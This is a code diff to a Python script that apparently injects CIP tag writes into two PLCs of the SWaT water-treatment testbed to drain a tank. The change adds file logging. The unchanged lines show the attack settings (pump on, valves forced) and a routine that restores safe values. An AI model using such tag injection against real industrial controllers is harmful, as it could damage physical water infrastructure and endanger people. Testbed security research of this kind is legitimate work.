@@ -13,9 +13,22 @@ Usage:
   python3 phase1_inject.py --plc-ip 192.168.1.10 --plc2-ip 192.168.1.20 --duration 120
 """
 
-import argparse, time, signal
+import argparse, time, signal, os
 from datetime import datetime
 from pylogix import PLC
+
+# ── Logging setup ─────────────────────────────────────────────────────────────
+LOG_DIR = os.path.join(os.path.dirname(__file__), '..', '..', 'logs')
+os.makedirs(LOG_DIR, exist_ok=True)
+LOG_FILE = os.path.join(LOG_DIR, f"phase1_{datetime.now().strftime('%Y%m%d_%H%M%S')}.log")
+_logfile = open(LOG_FILE, 'w', buffering=1)
+
+def tprint(*args, **kwargs):
+    msg = ' '.join(str(a) for a in args)
+    ts  = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
+    line = f"[{ts}] {msg}"
+    print(line, **kwargs)
+    _logfile.write(line + '\n')
 
 # PLC1 attack commands
 PLC1_CMDS = [
@@ -56,10 +69,10 @@ def ts():
 
 
 def inject_loop(plc1, plc2, duration, interval=1.0):
-    print(f"[ATTACK] Duration={duration}s")
-    print(f"[ATTACK] PLC1: P101=ON, MV101=CLOSED")
-    print(f"[ATTACK] PLC2: MV201=OPEN")
-    print(f"[ATTACK] LIT101 will drain to LL (250mm)\n")
+    tprint(f"[ATTACK] Duration={duration}s")
+    tprint(f"[ATTACK] PLC1: P101=ON, MV101=CLOSED")
+    tprint(f"[ATTACK] PLC2: MV201=OPEN")
+    tprint(f"[ATTACK] LIT101 will drain to LL (250mm)\n")
 
     cycle    = 0
     end_time = time.time() + duration
@@ -105,23 +118,23 @@ def inject_loop(plc1, plc2, duration, interval=1.0):
 
 
 def restore(plc1, plc2):
-    print(f"\n[RESTORE] Restoring safe state...")
+    tprint(f"\n[RESTORE] Restoring safe state...")
     for tag, val in PLC1_SAFE:
         ret = plc1.Write(tag, val)
-        print(f"    PLC1  {tag:25s} = {val}  [{ret.Status}]")
+        tprint(f"    PLC1  {tag:25s} = {val}  [{ret.Status}]")
     for tag, val in PLC2_SAFE:
         ret = plc2.Write(tag, val)
-        print(f"    PLC2  {tag:25s} = {val}  [{ret.Status}]")
+        tprint(f"    PLC2  {tag:25s} = {val}  [{ret.Status}]")
 
     time.sleep(1)
     mv1 = plc1.Read('HMI_MV101.Cmd').Value
     mv2 = plc2.Read('HMI_MV201.Cmd').Value
     p1a = plc1.Read('HMI_P101.Auto').Value
     lit = plc1.Read('HMI_LIT101.Pv').Value
-    print(f"\n[RESTORE] MV101={'OPEN' if mv1==2 else 'CLOSED'}  "
+    tprint(f"\n[RESTORE] MV101={'OPEN' if mv1==2 else 'CLOSED'}  "
           f"MV201={'CLOSED' if mv2==1 else 'OPEN'}  "
           f"P101.Auto={p1a}  LIT101={lit:.1f}mm")
-    print("[RESTORE] Done.")
+    tprint("[RESTORE] Done.")
 
 
 def signal_handler(sig, frame):
@@ -140,12 +153,13 @@ def main():
 
     signal.signal(signal.SIGINT, signal_handler)
 
-    print("=" * 60)
-    print("  SWaT Phase 1 — Direct CIP Tag Injection")
-    print(f"  PLC1: {args.plc_ip}   PLC2: {args.plc2_ip}")
-    print(f"  Duration: {args.duration}s")
-    print(f"  Started: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
-    print("=" * 60)
+    print("=" * 60)  # stdout only
+    print(f"[LOG] Writing to {LOG_FILE}")
+    tprint("  SWaT Phase 1 — Direct CIP Tag Injection")
+    tprint(f"  PLC1: {args.plc_ip}   PLC2: {args.plc2_ip}")
+    tprint(f"  Duration: {args.duration}s")
+    tprint(f"  Started: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
+    print("=" * 60)  # stdout only
 
     with PLC() as plc1, PLC() as plc2:
         plc1.IPAddress = args.plc_ip
@@ -167,7 +181,7 @@ def main():
         inject_loop(plc1, plc2, args.duration, args.interval)
         restore(plc1, plc2)
 
-    print("[+] Phase 1 complete.")
+    tprint("[+] Phase 1 complete.")
 
 
 if __name__ == '__main__':
